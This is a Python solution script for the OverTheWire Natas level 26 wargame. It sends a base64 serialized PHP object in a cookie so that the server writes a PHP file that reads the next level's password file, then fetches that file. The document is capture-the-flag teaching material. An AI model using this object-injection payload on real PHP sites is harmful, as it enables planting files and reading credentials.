import requests
import re
import base64

username = "natas26"
password = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

# some random coordinates
coord = "?x1=0&y1=0&x2=400&y2=400"
response = session.get(url+coord,auth=(username,password))
# use of natas26-php-tool.php to generate the cookie
mal_cookie={"drawing":"Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvb21nLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjk6ImhleXl5eXl5CiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYzOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA%2FPgoiO30%3D","PHPSESSID":session.cookies["PHPSESSID"]}
php_path = "img/omg.php" # The name of the php file that I created through the cookie (you can change it if you want)
response = session.get(url,auth=(username,password),cookies=mal_cookie)
print(response.text)
print("="*50)

file = session.get(url+php_path,auth=(username,password))
print("\nThe password for the next level is: " + file.text)